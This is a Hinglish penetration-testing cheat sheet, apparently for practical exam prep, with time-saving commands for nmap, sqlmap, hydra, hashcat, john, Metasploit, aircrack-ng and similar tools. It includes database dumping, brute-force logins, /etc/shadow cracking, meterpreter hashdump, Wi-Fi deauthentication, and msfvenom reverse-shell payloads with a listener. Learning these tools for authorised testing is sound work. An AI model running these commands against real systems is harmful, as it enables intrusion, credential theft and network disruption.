# ⚡ Tool Shortcuts — Smart Moves

> Har tool ke liye 1-2 "smart moves" jo time bachate hain. Yeh chapter prep ke time padho — exam mein muscle memory chahiye.

## nmap

**Smart move 1:** `-oA` always. Saves output in 3 formats. Re-run nahi karna padta.
```bash
nmap -sV -sC -p- -T4 -oA full <IP>
```

**Smart move 2:** Background + grep:
```bash
nmap -sV -sC -p- -T4 -oA full <IP> &
# later:
grep open full.nmap
```

**Smart move 3:** "Mega scan" for shared targets:
```bash
sudo nmap -sV -sC -O -p- --script "vuln,smb-*,http-*" -T4 -oA mega <IP>
# answers 5-6 questions in one shot
```

**Smart move 4:** UDP top-20 only (UDP is slow):
```bash
sudo nmap -sU --top-ports 20 <IP>
```

---

## sqlmap

**Smart move 1:** Always `--batch` to skip prompts:
```bash
sqlmap -u "URL" --batch --dump
```

**Smart move 2:** Use `-r request.txt` from Burp instead of typing URL/cookie/POST:
1. Capture request in Burp → right-click → "Copy to file" → save as `req.txt`
2. `sqlmap -r req.txt --batch --dbs`

**Smart move 3:** Step ladder, not `--dump-all` immediately:
```bash
sqlmap -u URL --batch --dbs              # find DBs
sqlmap -u URL --batch -D <db> --tables   # find tables
sqlmap -u URL --batch -D <db> -T <tbl> --columns
sqlmap -u URL --batch -D <db> -T <tbl> -C user,pass --dump
```
Faster than `--dump-all`.

**Smart move 4:** Use `--threads=10` for big dumps.

---

## hashcat

**Smart move 1:** Memorize top 5 mode numbers:
- `0` = MD5
- `100` = SHA1
- `1000` = NTLM
- `1800` = SHA512crypt (Linux shadow)
- `22000` = WPA-PBKDF2 (modern WPA)

**Smart move 2:** `--show` to see already cracked:
```bash
hashcat -m 1000 hashes.txt --show
```

**Smart move 3:** Background + check periodically:
```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -O &
# later
hashcat -m 1000 hashes.txt --show
```

**Smart move 4:** Best64 rules for harder passwords:
```bash
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## hydra

**Smart move 1:** Always use `-V` to see attempts (verbose):
```bash
hydra -l admin -P rockyou.txt ssh://10.10.10.5 -V
```

**Smart move 2:** `-f` to stop on first hit (don't waste time):
```bash
hydra -l admin -P rockyou.txt ssh://10.10.10.5 -f
```

**Smart move 3:** HTTP form syntax (the tricky one):
```bash
hydra -l admin -P pass.txt 10.10.10.5 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```
Note: `F=incorrect` matches the FAILURE message (or `S=` for success).

**Smart move 4:** `-t 4` if target is slow, `-t 16` if fast.

---

## john

**Smart move 1:** `unshadow` for /etc/shadow + /etc/passwd:
```bash
unshadow passwd shadow > combined
john combined
```

**Smart move 2:** Format hint speeds it up:
```bash
john --format=NT hashes.txt
```

**Smart move 3:** Show cracked:
```bash
john --show hashes.txt
```

**Smart move 4:** `*2john` converters for special files:
- `zip2john file.zip > zip.hash`
- `ssh2john id_rsa > ssh.hash`
- `pdf2john file.pdf > pdf.hash`
- `keepass2john file.kdbx > kp.hash`

---

## gobuster

**Smart move 1:** Add extensions immediately:
```bash
gobuster dir -u http://target -w wordlist.txt -x php,html,txt,bak
```

**Smart move 2:** Threads up:
```bash
gobuster dir ... -t 50
```

**Smart move 3:** Use `dirbuster medium` for thorough, `dirb common` for fast:
- Fast: `/usr/share/wordlists/dirb/common.txt`
- Thorough: `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

---

## enum4linux

**Smart move 1:** Just use `-a` (everything):
```bash
enum4linux -a 10.10.10.5
```

**Smart move 2:** Pipe to file (long output):
```bash
enum4linux -a 10.10.10.5 | tee enum.txt
```

---

## smbclient

**Smart move 1:** List shares anonymously:
```bash
smbclient -L //10.10.10.5/ -N
```

**Smart move 2:** Connect anonymously:
```bash
smbclient //10.10.10.5/sharename -N
```

**Smart move 3:** Inside smbclient: `ls`, `get file`, `mget *`, `recurse on`, `prompt off`.

---

## metasploit

**Smart move 1:** Quick search + use:
```bash
msf6> search ms17-010
msf6> use 0
msf6> options
msf6> set RHOSTS 10.10.10.5
msf6> run
```
`use 0` is faster than typing module path.

**Smart move 2:** `setg` (global set) for IPs you'll reuse:
```bash
msf6> setg RHOSTS 10.10.10.5
msf6> setg LHOST 10.10.10.X
```

**Smart move 3:** Resource scripts to automate:
```bash
echo "use exploit/...; set RHOSTS ...; run" > rc.rc
msfconsole -r rc.rc
```

**Smart move 4:** Inside meterpreter: `getuid`, `sysinfo`, `hashdump`, `shell`, `download`, `upload`.

---

## msfvenom

**Smart move 1:** Common payloads memorize:
```bash
# Windows reverse shell exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o sh.exe

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o sh.elf

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o sh.php
```

**Smart move 2:** Pair with handler always:
```bash
msf6> use exploit/multi/handler
msf6> set PAYLOAD <same payload>
msf6> set LHOST <IP>
msf6> set LPORT 4444
msf6> run
```

---

## wireshark

**Smart move 1:** Top filters memorize:
- `http.request` — only HTTP requests
- `http.request.method == "POST"` — POST only
- `tcp.port == 21` — FTP
- `ftp.request.command == "PASS"` — FTP password
- `ip.src == 10.10.10.5` — from a host
- `tcp.flags.syn == 1 and tcp.flags.ack == 0` — SYN-only (scans)
- `dns` — all DNS

**Smart move 2:** Right-click packet → Follow → TCP Stream — sees full conversation.

**Smart move 3:** File → Export Objects → HTTP / SMB — extracts files from capture.

**Smart move 4:** Statistics → Conversations — see who talked to whom.

---

## aircrack-ng suite

**Smart move 1:** Full WPA flow as one block (memorize):
```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon                        # find target BSSID/channel
sudo airodump-ng -c <CH> --bssid <BSSID> -w cap wlan0mon
# In another tab:
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
# Wait for handshake (top of airodump screen)
aircrack-ng -w /usr/share/wordlists/rockyou.txt cap-01.cap
```

**Smart move 2:** Convert .cap to hashcat format for GPU:
```bash
hcxpcapngtool -o hash.hc22000 cap-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt
```

---

## openssl

**Smart move 1:** AES decrypt:
```bash
openssl enc -aes-256-cbc -d -pbkdf2 -in cipher.txt -out plain.txt -k <password>
```

**Smart move 2:** SSL cert inspect:
```bash
echo | openssl s_client -connect <IP>:443 2>/dev/null | openssl x509 -noout -text
```

**Smart move 3:** Quick base64:
```bash
echo "data" | openssl base64
echo "ZGF0YQo=" | openssl base64 -d
```

---

## steghide

**Smart move 1:** Always try blank password first:
```bash
steghide extract -sf image.jpg
# Press Enter when asked for passphrase
```

**Smart move 2:** Common passwords list:
```bash
for pw in "" password 123456 admin secret; do
  echo "Trying: $pw"
  steghide extract -sf image.jpg -p "$pw" 2>/dev/null && break
done
```

**Smart move 3:** stegseek for brute force:
```bash
stegseek image.jpg /usr/share/wordlists/rockyou.txt
```

---

## exiftool

**Smart move 1:** All metadata:
```bash
exiftool image.jpg
```

**Smart move 2:** Specific tag:
```bash
exiftool -GPSPosition image.jpg
exiftool -Comment image.jpg
exiftool -Author *.pdf
```

---

## binwalk

**Smart move 1:** Default scan + extract:
```bash
binwalk -e file.bin
```

**Smart move 2:** Recursive extract:
```bash
binwalk -Me file.bin
```

---

## curl

**Smart move 1:** Banner grab:
```bash
curl -I http://10.10.10.5
```

**Smart move 2:** With cookies:
```bash
curl -b "PHPSESSID=abc" http://target/admin
```

**Smart move 3:** POST data:
```bash
curl -X POST -d "user=admin&pass=admin" http://target/login
```

**Smart move 4:** Save and verbose:
```bash
curl -v -o output.html http://target
```

---

## The meta shortcut

**Best shortcut of all:** Yeh repo. Ctrl+F sirf isi mein karna sikho. Prep mein 50 baar use karoge → exam mein subliminal ho jayega.
